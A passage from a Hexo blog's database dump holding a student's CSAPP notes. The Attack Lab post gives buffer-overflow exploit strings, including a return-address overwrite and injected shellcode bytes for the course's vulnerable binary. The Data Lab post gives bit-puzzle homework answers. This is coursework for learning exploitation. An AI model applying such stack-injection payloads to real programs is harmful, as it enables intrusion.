ighlight/prismjs/line-number.styl","hash":"d40f1baec16c4a62e4a3a9a0379d1ca3ac6746b2","modified":1604311997510},{"_id":"themes/butterfly/source/css/_layout/head.styl","hash":"3924f186002a22d326ce2991e2c46294b6e360fd","modified":1604311997510},{"_id":"source/img/Begin Again.jpg","hash":"07925063bc45e8cad5c8fc502f07490350cad5a4","modified":1604312001240},{"_id":"themes/butterfly/source/img/cover.png","hash":"cfc547d2890b5d9138d64161b31d4fd41cdbcba0","modified":1604311997510},{"_id":"source/music/Lost Stars.m4a","hash":"e1f87d7697c826dfd822a0309f2f7273ede6c295","modified":1604312001290},{"_id":"source/_posts/2020，提灯寻影，举袂遮月.md","hash":"16d5b3816759a615357e816825222dda33019645","modified":1609430565091},{"_id":"source/img/2020.jpg","hash":"e51b4133a79054679af6f6c9f054de94465cffa3","modified":1609429636972},{"_id":"source/resume.pdf","hash":"e855c1ae2ac53b6db1756fab127e709b37c88169","modified":1610808761724},{"_id":"source/_posts/OS-lab-配置.md","hash":"f663b365dd9b4adc419f1dd0af999911d6d9e9b6","modified":1611239839955},{"_id":"source/img/OS.jpg","hash":"e3e6d572275e38017eda3941a3d497f0cb135c87","modified":1611239653182}],"Category":[],"Data":[],"Page":[{"title":"About Me","date":"2020-10-31T08:53:47.000Z","_content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=32102655&auto=0&height=66\"></iframe>\n\n\n\n[Resume](/resume.pdf)","source":"about/index.md","raw":"---\ntitle: About Me\ndate: 2020-10-31 16:53:47\n---\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=32102655&auto=0&height=66\"></iframe>\n\n\n\n[Resume](/resume.pdf)","updated":"2021-01-16T10:20:59.496Z","path":"about/index.html","_id":"ckiszi59p000098wa9ueycjbl","comments":1,"layout":"page","content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=32102655&auto=0&height=66\"></iframe>\n<p><a href=\"/resume.pdf\">Resume</a></p>\n","site":{"data":{}},"cover":"https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg","excerpt":"","more":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=100% height=86 src=\"//music.163.com/outchain/player?type=2&id=32102655&auto=0&height=66\"></iframe>\n<p><a href=\"/resume.pdf\">Resume</a></p>\n"},{"title":"tags","date":"2020-10-29T08:45:07.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2020-10-29 16:45:07\ntype: \"tags\"\n---\n","updated":"2020-11-02T10:13:17.500Z","path":"tags/index.html","_id":"ckiszi59y000298wa2yelh1ju","comments":1,"layout":"page","content":"","site":{"data":{}},"cover":"https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg","excerpt":"","more":""}],"Post":[{"title":"Bomb Lab","top_img":false,"cover":"/img/CSAPP.jpeg","date":"2020-11-30T14:00:07.000Z","_content":"\n拖延症本人终于要做BombLab了，激动的搓手手。\n\n已经做完了，索然无味。有空写。。","source":"_posts/Bomb-Lab.md","raw":"---\ntitle: Bomb Lab\ntop_img: false\ncover: /img/CSAPP.jpeg\ndate: 2020-11-30 22:00:07\ntags:\n- CSAPP\n---\n\n拖延症本人终于要做BombLab了，激动的搓手手。\n\n已经做完了，索然无味。有空写。。","slug":"Bomb-Lab","published":1,"updated":"2020-12-15T08:51:22.019Z","_id":"ckiszi59t000198wa2bpm99t1","comments":1,"layout":"post","photos":[],"link":"","content":"<p>拖延症本人终于要做BombLab了，激动的搓手手。</p>\n<p>已经做完了，索然无味。有空写。。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>拖延症本人终于要做BombLab了，激动的搓手手。</p>\n<p>已经做完了，索然无味。有空写。。</p>\n"},{"title":"Attack Lab 记录","top_img":false,"cover":"/img/CSAPP.jpeg","date":"2020-12-16T09:14:09.000Z","_content":"\n## Phase 1\n\n先反汇编得到`getbuf`的代码\n\n```assembly\n00000000004017d3 <getbuf>:\n  4017d3:\t48 83 ec 38          \tsub    $0x38,%rsp\n  4017d7:\t48 89 e7             \tmov    %rsp,%rdi\n  4017da:\te8 44 02 00 00       \tcallq  401a23 <Gets>\n  4017df:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4017e4:\t48 83 c4 38          \tadd    $0x38,%rsp\n  4017e8:\tc3                   \tretq   \n```\n\n第2行中，申请了0x38字节的空间，然后将栈顶的地址作为参数调用`Gets`。所以`BUFFER_SIZE`是0x38。\n\n这里的逻辑是：`test`函数调用`getbuf`函数，`getbuf`函数再调用`Gets`，而写入字符串的动作在`Gets`函数里。在`test`中`call getbuf`时，将`test`函数（里一条指令）的地址压入了栈，然后在`getbuf`中`call Gets`时，再将`getbuf`的一条指令地址压入栈（这里其实是代码里第五条指令）。也就是说，能更改的只能是第一次压入栈的地址，因为它处于为字符串分配的空间的高地址处。因此需要改变的行为是：让`getbuf`返回时，让它不回到`test`而前往`touch1`。\n\n找到`touch1`的汇编\n\n```assembly\n00000000004017e9 <touch1>:\n  4017e9:\t48 83 ec 08          \tsub    $0x8,%rsp\n  4017ed:\tc7 05 05 2d 20 00 01 \tmovl   $0x1,0x202d05(%rip)        # 6044fc <vlevel>\n  4017f4:\t00 00 00 \n  4017f7:\t48 8d 3d bd 17 00 00 \tlea    0x17bd(%rip),%rdi        # 402fbb <_IO_stdin_used+0x2cb>\n  4017fe:\te8 2d f4 ff ff       \tcallq  400c30 <puts@plt>\n  401803:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  401808:\te8 2d 04 00 00       \tcallq  401c3a <validate>\n  40180d:\tbf 00 00 00 00       \tmov    $0x0,%edi\n  401812:\te8 99 f5 ff ff       \tcallq  400db0 <exit@plt>\n```\n\n那就很简单了，只要把前0x38个字符先随便填，然后把`touch1`的地址写入就好了。（小端）\n\n```\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\ne9 17 40 00 00 00 00 00\n```\n\n## Phase 2\n\nPhase 2 有个额外的要求就是把Cookie当作参数传入，我的Cookie是`0x615ab299`。那单单修改返回地址就不够了，因为程序正常执行时，并不会把Cookie传入`%rdi`，那只要把指令写到栈中，让它`ret`到我的指令上就可以了。那该如何再回到`touch2`呢？我的做法是将Cookie传入`%rdi`后，再往栈中压入`touch2`的地址，再`ret`。\n\ntouch2的地址：0x401817\n\n我需要插入三条指令，让`getbuf`遇到`ret`后先来到我的指令，然后再前往`touch2`\n\n```assembly\ngetbuf:\n  sub    $0x38,%rsp\n  mov    %rsp,%rdi\n  callq  401a23 <Gets>\n  mov    $0x1,%eax\n  add    $0x38,%rsp\n  retq\nMyAss:\n  movq\t $0x615ab299, %rdi\n  push\t $0x401817\n  ret\n```\n\n最后用gcc和objdump就能得到源码\n\n```assembly\n48 c7 c7 99 b2 5a 61 /* movq\t $0x615ab299, %rdi */\n68 17 18 40 00 /* push\t $0x401817 */\nc3 /* ret */\n00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n08 ec 66 55 00 00 00 00 /* 0x38个字节的首地址，也就是我的指令的初始地址*/\n```\n\n## Phase 3 & 4 & 5\n\nphase 3和4自己做出来了\n\nphase 5自己没琢磨清楚，百度教我做出来了。有空再写一下。","source":"_posts/Attack-Lab-记录.md","raw":"---\ntitle: Attack Lab 记录\ntop_img: false\ncover: /img/CSAPP.jpeg\ndate: 2020-12-16 17:14:09\ntags:\n- CSAPP\n---\n\n## Phase 1\n\n先反汇编得到`getbuf`的代码\n\n```assembly\n00000000004017d3 <getbuf>:\n  4017d3:\t48 83 ec 38          \tsub    $0x38,%rsp\n  4017d7:\t48 89 e7             \tmov    %rsp,%rdi\n  4017da:\te8 44 02 00 00       \tcallq  401a23 <Gets>\n  4017df:\tb8 01 00 00 00       \tmov    $0x1,%eax\n  4017e4:\t48 83 c4 38          \tadd    $0x38,%rsp\n  4017e8:\tc3                   \tretq   \n```\n\n第2行中，申请了0x38字节的空间，然后将栈顶的地址作为参数调用`Gets`。所以`BUFFER_SIZE`是0x38。\n\n这里的逻辑是：`test`函数调用`getbuf`函数，`getbuf`函数再调用`Gets`，而写入字符串的动作在`Gets`函数里。在`test`中`call getbuf`时，将`test`函数（里一条指令）的地址压入了栈，然后在`getbuf`中`call Gets`时，再将`getbuf`的一条指令地址压入栈（这里其实是代码里第五条指令）。也就是说，能更改的只能是第一次压入栈的地址，因为它处于为字符串分配的空间的高地址处。因此需要改变的行为是：让`getbuf`返回时，让它不回到`test`而前往`touch1`。\n\n找到`touch1`的汇编\n\n```assembly\n00000000004017e9 <touch1>:\n  4017e9:\t48 83 ec 08          \tsub    $0x8,%rsp\n  4017ed:\tc7 05 05 2d 20 00 01 \tmovl   $0x1,0x202d05(%rip)        # 6044fc <vlevel>\n  4017f4:\t00 00 00 \n  4017f7:\t48 8d 3d bd 17 00 00 \tlea    0x17bd(%rip),%rdi        # 402fbb <_IO_stdin_used+0x2cb>\n  4017fe:\te8 2d f4 ff ff       \tcallq  400c30 <puts@plt>\n  401803:\tbf 01 00 00 00       \tmov    $0x1,%edi\n  401808:\te8 2d 04 00 00       \tcallq  401c3a <validate>\n  40180d:\tbf 00 00 00 00       \tmov    $0x0,%edi\n  401812:\te8 99 f5 ff ff       \tcallq  400db0 <exit@plt>\n```\n\n那就很简单了，只要把前0x38个字符先随便填，然后把`touch1`的地址写入就好了。（小端）\n\n```\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\ne9 17 40 00 00 00 00 00\n```\n\n## Phase 2\n\nPhase 2 有个额外的要求就是把Cookie当作参数传入，我的Cookie是`0x615ab299`。那单单修改返回地址就不够了，因为程序正常执行时，并不会把Cookie传入`%rdi`，那只要把指令写到栈中，让它`ret`到我的指令上就可以了。那该如何再回到`touch2`呢？我的做法是将Cookie传入`%rdi`后，再往栈中压入`touch2`的地址，再`ret`。\n\ntouch2的地址：0x401817\n\n我需要插入三条指令，让`getbuf`遇到`ret`后先来到我的指令，然后再前往`touch2`\n\n```assembly\ngetbuf:\n  sub    $0x38,%rsp\n  mov    %rsp,%rdi\n  callq  401a23 <Gets>\n  mov    $0x1,%eax\n  add    $0x38,%rsp\n  retq\nMyAss:\n  movq\t $0x615ab299, %rdi\n  push\t $0x401817\n  ret\n```\n\n最后用gcc和objdump就能得到源码\n\n```assembly\n48 c7 c7 99 b2 5a 61 /* movq\t $0x615ab299, %rdi */\n68 17 18 40 00 /* push\t $0x401817 */\nc3 /* ret */\n00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n08 ec 66 55 00 00 00 00 /* 0x38个字节的首地址，也就是我的指令的初始地址*/\n```\n\n## Phase 3 & 4 & 5\n\nphase 3和4自己做出来了\n\nphase 5自己没琢磨清楚，百度教我做出来了。有空再写一下。","slug":"Attack-Lab-记录","published":1,"updated":"2020-12-17T14:03:48.879Z","_id":"ckiszi59z000398wa3qj0ax2s","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"phase-1\"><a class=\"markdownIt-Anchor\" href=\"#phase-1\"></a> Phase 1</h2>\n<p>先反汇编得到<code>getbuf</code>的代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000000004017d3 &lt;getbuf&gt;:</span><br><span class=\"line\">  4017d3:\t48 83 ec 38          \tsub    $0x38,%rsp</span><br><span class=\"line\">  4017d7:\t48 89 e7             \tmov    %rsp,%rdi</span><br><span class=\"line\">  4017da:\te8 44 02 00 00       \tcallq  401a23 &lt;Gets&gt;</span><br><span class=\"line\">  4017df:\tb8 01 00 00 00       \tmov    $0x1,%eax</span><br><span class=\"line\">  4017e4:\t48 83 c4 38          \tadd    $0x38,%rsp</span><br><span class=\"line\">  4017e8:\tc3                   \tretq   </span><br></pre></td></tr></table></figure>\n<p>第2行中，申请了0x38字节的空间，然后将栈顶的地址作为参数调用<code>Gets</code>。所以<code>BUFFER_SIZE</code>是0x38。</p>\n<p>这里的逻辑是：<code>test</code>函数调用<code>getbuf</code>函数，<code>getbuf</code>函数再调用<code>Gets</code>，而写入字符串的动作在<code>Gets</code>函数里。在<code>test</code>中<code>call getbuf</code>时，将<code>test</code>函数（里一条指令）的地址压入了栈，然后在<code>getbuf</code>中<code>call Gets</code>时，再将<code>getbuf</code>的一条指令地址压入栈（这里其实是代码里第五条指令）。也就是说，能更改的只能是第一次压入栈的地址，因为它处于为字符串分配的空间的高地址处。因此需要改变的行为是：让<code>getbuf</code>返回时，让它不回到<code>test</code>而前往<code>touch1</code>。</p>\n<p>找到<code>touch1</code>的汇编</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000000004017e9 &lt;touch1&gt;:</span><br><span class=\"line\">  4017e9:\t48 83 ec 08          \tsub    $0x8,%rsp</span><br><span class=\"line\">  4017ed:\tc7 05 05 2d 20 00 01 \tmovl   $0x1,0x202d05(%rip)        # 6044fc &lt;vlevel&gt;</span><br><span class=\"line\">  4017f4:\t00 00 00 </span><br><span class=\"line\">  4017f7:\t48 8d 3d bd 17 00 00 \tlea    0x17bd(%rip),%rdi        # 402fbb &lt;_IO_stdin_used+0x2cb&gt;</span><br><span class=\"line\">  4017fe:\te8 2d f4 ff ff       \tcallq  400c30 &lt;puts@plt&gt;</span><br><span class=\"line\">  401803:\tbf 01 00 00 00       \tmov    $0x1,%edi</span><br><span class=\"line\">  401808:\te8 2d 04 00 00       \tcallq  401c3a &lt;validate&gt;</span><br><span class=\"line\">  40180d:\tbf 00 00 00 00       \tmov    $0x0,%edi</span><br><span class=\"line\">  401812:\te8 99 f5 ff ff       \tcallq  400db0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>\n<p>那就很简单了，只要把前0x38个字符先随便填，然后把<code>touch1</code>的地址写入就好了。（小端）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">e9 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>\n<h2 id=\"phase-2\"><a class=\"markdownIt-Anchor\" href=\"#phase-2\"></a> Phase 2</h2>\n<p>Phase 2 有个额外的要求就是把Cookie当作参数传入，我的Cookie是<code>0x615ab299</code>。那单单修改返回地址就不够了，因为程序正常执行时，并不会把Cookie传入<code>%rdi</code>，那只要把指令写到栈中，让它<code>ret</code>到我的指令上就可以了。那该如何再回到<code>touch2</code>呢？我的做法是将Cookie传入<code>%rdi</code>后，再往栈中压入<code>touch2</code>的地址，再<code>ret</code>。</p>\n<p>touch2的地址：0x401817</p>\n<p>我需要插入三条指令，让<code>getbuf</code>遇到<code>ret</code>后先来到我的指令，然后再前往<code>touch2</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getbuf:</span><br><span class=\"line\">  sub    $0x38,%rsp</span><br><span class=\"line\">  mov    %rsp,%rdi</span><br><span class=\"line\">  callq  401a23 &lt;Gets&gt;</span><br><span class=\"line\">  mov    $0x1,%eax</span><br><span class=\"line\">  add    $0x38,%rsp</span><br><span class=\"line\">  retq</span><br><span class=\"line\">MyAss:</span><br><span class=\"line\">  movq\t $0x615ab299, %rdi</span><br><span class=\"line\">  push\t $0x401817</span><br><span class=\"line\">  ret</span><br></pre></td></tr></table></figure>\n<p>最后用gcc和objdump就能得到源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">48 c7 c7 99 b2 5a 61 &#x2F;* movq\t $0x615ab299, %rdi *&#x2F;</span><br><span class=\"line\">68 17 18 40 00 &#x2F;* push\t $0x401817 *&#x2F;</span><br><span class=\"line\">c3 &#x2F;* ret *&#x2F;</span><br><span class=\"line\">00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">08 ec 66 55 00 00 00 00 &#x2F;* 0x38个字节的首地址，也就是我的指令的初始地址*&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"phase-3-4-5\"><a class=\"markdownIt-Anchor\" href=\"#phase-3-4-5\"></a> Phase 3 &amp; 4 &amp; 5</h2>\n<p>phase 3和4自己做出来了</p>\n<p>phase 5自己没琢磨清楚，百度教我做出来了。有空再写一下。</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"phase-1\"><a class=\"markdownIt-Anchor\" href=\"#phase-1\"></a> Phase 1</h2>\n<p>先反汇编得到<code>getbuf</code>的代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000000004017d3 &lt;getbuf&gt;:</span><br><span class=\"line\">  4017d3:\t48 83 ec 38          \tsub    $0x38,%rsp</span><br><span class=\"line\">  4017d7:\t48 89 e7             \tmov    %rsp,%rdi</span><br><span class=\"line\">  4017da:\te8 44 02 00 00       \tcallq  401a23 &lt;Gets&gt;</span><br><span class=\"line\">  4017df:\tb8 01 00 00 00       \tmov    $0x1,%eax</span><br><span class=\"line\">  4017e4:\t48 83 c4 38          \tadd    $0x38,%rsp</span><br><span class=\"line\">  4017e8:\tc3                   \tretq   </span><br></pre></td></tr></table></figure>\n<p>第2行中，申请了0x38字节的空间，然后将栈顶的地址作为参数调用<code>Gets</code>。所以<code>BUFFER_SIZE</code>是0x38。</p>\n<p>这里的逻辑是：<code>test</code>函数调用<code>getbuf</code>函数，<code>getbuf</code>函数再调用<code>Gets</code>，而写入字符串的动作在<code>Gets</code>函数里。在<code>test</code>中<code>call getbuf</code>时，将<code>test</code>函数（里一条指令）的地址压入了栈，然后在<code>getbuf</code>中<code>call Gets</code>时，再将<code>getbuf</code>的一条指令地址压入栈（这里其实是代码里第五条指令）。也就是说，能更改的只能是第一次压入栈的地址，因为它处于为字符串分配的空间的高地址处。因此需要改变的行为是：让<code>getbuf</code>返回时，让它不回到<code>test</code>而前往<code>touch1</code>。</p>\n<p>找到<code>touch1</code>的汇编</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00000000004017e9 &lt;touch1&gt;:</span><br><span class=\"line\">  4017e9:\t48 83 ec 08          \tsub    $0x8,%rsp</span><br><span class=\"line\">  4017ed:\tc7 05 05 2d 20 00 01 \tmovl   $0x1,0x202d05(%rip)        # 6044fc &lt;vlevel&gt;</span><br><span class=\"line\">  4017f4:\t00 00 00 </span><br><span class=\"line\">  4017f7:\t48 8d 3d bd 17 00 00 \tlea    0x17bd(%rip),%rdi        # 402fbb &lt;_IO_stdin_used+0x2cb&gt;</span><br><span class=\"line\">  4017fe:\te8 2d f4 ff ff       \tcallq  400c30 &lt;puts@plt&gt;</span><br><span class=\"line\">  401803:\tbf 01 00 00 00       \tmov    $0x1,%edi</span><br><span class=\"line\">  401808:\te8 2d 04 00 00       \tcallq  401c3a &lt;validate&gt;</span><br><span class=\"line\">  40180d:\tbf 00 00 00 00       \tmov    $0x0,%edi</span><br><span class=\"line\">  401812:\te8 99 f5 ff ff       \tcallq  400db0 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>\n<p>那就很简单了，只要把前0x38个字符先随便填，然后把<code>touch1</code>的地址写入就好了。（小端）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">e9 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>\n<h2 id=\"phase-2\"><a class=\"markdownIt-Anchor\" href=\"#phase-2\"></a> Phase 2</h2>\n<p>Phase 2 有个额外的要求就是把Cookie当作参数传入，我的Cookie是<code>0x615ab299</code>。那单单修改返回地址就不够了，因为程序正常执行时，并不会把Cookie传入<code>%rdi</code>，那只要把指令写到栈中，让它<code>ret</code>到我的指令上就可以了。那该如何再回到<code>touch2</code>呢？我的做法是将Cookie传入<code>%rdi</code>后，再往栈中压入<code>touch2</code>的地址，再<code>ret</code>。</p>\n<p>touch2的地址：0x401817</p>\n<p>我需要插入三条指令，让<code>getbuf</code>遇到<code>ret</code>后先来到我的指令，然后再前往<code>touch2</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getbuf:</span><br><span class=\"line\">  sub    $0x38,%rsp</span><br><span class=\"line\">  mov    %rsp,%rdi</span><br><span class=\"line\">  callq  401a23 &lt;Gets&gt;</span><br><span class=\"line\">  mov    $0x1,%eax</span><br><span class=\"line\">  add    $0x38,%rsp</span><br><span class=\"line\">  retq</span><br><span class=\"line\">MyAss:</span><br><span class=\"line\">  movq\t $0x615ab299, %rdi</span><br><span class=\"line\">  push\t $0x401817</span><br><span class=\"line\">  ret</span><br></pre></td></tr></table></figure>\n<p>最后用gcc和objdump就能得到源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">48 c7 c7 99 b2 5a 61 &#x2F;* movq\t $0x615ab299, %rdi *&#x2F;</span><br><span class=\"line\">68 17 18 40 00 &#x2F;* push\t $0x401817 *&#x2F;</span><br><span class=\"line\">c3 &#x2F;* ret *&#x2F;</span><br><span class=\"line\">00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">00 00 00 00 00 00 00 00</span><br><span class=\"line\">08 ec 66 55 00 00 00 00 &#x2F;* 0x38个字节的首地址，也就是我的指令的初始地址*&#x2F;</span><br></pre></td></tr></table></figure>\n<h2 id=\"phase-3-4-5\"><a class=\"markdownIt-Anchor\" href=\"#phase-3-4-5\"></a> Phase 3 &amp; 4 &amp; 5</h2>\n<p>phase 3和4自己做出来了</p>\n<p>phase 5自己没琢磨清楚，百度教我做出来了。有空再写一下。</p>\n"},{"title":"CSAPP Data Lab 随记","date":"2020-10-28T08:57:11.000Z","top_img":false,"cover":"/img/CSAPP.jpeg","_content":"## bang\n**bang - Compute !x without using !**\n\n分治\n\n```c\nint bang(int x) {\n  int y = x | (x>>16);\n\n  y = y | (y>>8);\n  y = y | (y>>4);\n  y = y | (y>>2);\n  y = y | (y>>1);\n\n  return 1^(1&y);\n}\n```\n## bitCount\n**bitCount - returns count of number of 1's in word**\n\n分治\n\n```c\nint bitCount(int x) {\n  int mask = 0x11|(0x11<<8)|(0x11<<16)|(0x11<<24);\n  int y = (x&mask)+((x>>1)&mask)+((x>>2)&mask)+((x>>3)&mask);\n  int n1,n2,n3;\n\n  y = y + (y>>16);\n  n1 = y & 0xF;\n  n2 = (y >> 4) & 0xF;\n  n3 = (y >> 8) & 0xF;\n\n  return n1+n2+n3+((y>>12) & 0xF);\n}\n```\n## copyLSB\n**copyLSB - set all bits of result to least significant bit of x**\n\n比较简单\n```c\nint copyLSB(int x) {\n  return (~(x&1)+1);\n}\n```\n## divpwr2 \n**divpwr2 - Compute x/(2^n), for 0 <= n <= 30**\n\n需要用一个偏置量bias，这题我是抄的，思路待补充。\n```c\nint divpwr2(int x, int n) {\n  int y = x>>31;\n  x += (y & ((1<<n)+~0));\n  return x >>n;\n}\n```\n## evenBits \n**evenBits - return word with all even-numbered bits set to 1**\n\n简单\n```c\nint evenBits(void) {\n  return 0x55|(0x55<<8)|(0x55<<16)|(0x55<<24);\n}\n```\n## fitsBits\n**fitsBits - return 1 if x can be represented as an n-bit, two's complement integer.**\n\n我感觉最难的题\n假如x可以被n位bit表示，且x大于等于0时，那么x>>(n-1)一定等于0\n如果x小于0，那么x>>(n-1)一定等于0xffffffff，即~(x>>(n-1))一定等于0\n```c\nint fitsBits(int x, int n) {\n  int y = x >> 31;\n  int z = n + (~1+1);\n  return ((!y)&!(x>>z))|((y+2)&!(~(x>>z)));\n}\n```\n\n## getByte\n**getByte - Extract byte n from word x**\n\n简单的\n```c\nint getByte(int x, int n) {\n  return (x>>(n<<3))&0xFF;\n}\n```\n\n## isGreater\n**isGreater - if x > y  then return 1, else return 0 **\n\n先剔除两个整数异号的情况，然后就好了\n\n```c\nint isGreater(int x, int y) {\n  int particular1 = (y>>31)&1&!(x>>31);\n  /*\n   * particular1 = 1 when x>0 and y<0\n   * particular1 = 0 otherwise\n   */\n  int particular2 = (x>>31)&1&!(y>>31);\n  /*\n   * particular2 = 1 when x<0 and y>0\n   * particular2 = 0 otherwise\n   */\n  /*\n   * if p1 = 1 return 1\n   * else if p2=1 return 0\n   * else return normal\n   */\n\n  return particular1|((!particular2)&((~x+1+y)>>31)&1);\n}\n```\n\n## isNonNegative\n**isNonNegative - return 1 if x >= 0, return 0 otherwise **\n\n```c\nint isNonNegative(int x) {\n  return !(x>>31);\n}\n```\n\n## isNotEqual\n**isNotEqual - return 0 if x == y, and 1 otherwise**\n\n```c\nint isNotEqual(int x, int y) {\n  return !!(x^y);\n}\n```\n\n## isPower2\n**isPower2 - returns 1 if x is a power of 2, and 0 otherwise**\n\n这道题不简单，但是思路已经忘记了，想起来再写。应该用了分组处理的办法\n\n```c\nint isPower2(int x) {\n  int mask = 0x11|(0x11<<8)|(0x11<<16)|(0x11<<24);\n  int y = (x&mask)+((x>>1)&mask)+((x>>2)&mask)+((x>>3)&mask);\n  int n,n2,n3;\n\n  y = y + (y>>16);\n  n = y & 0xF;\n  n2 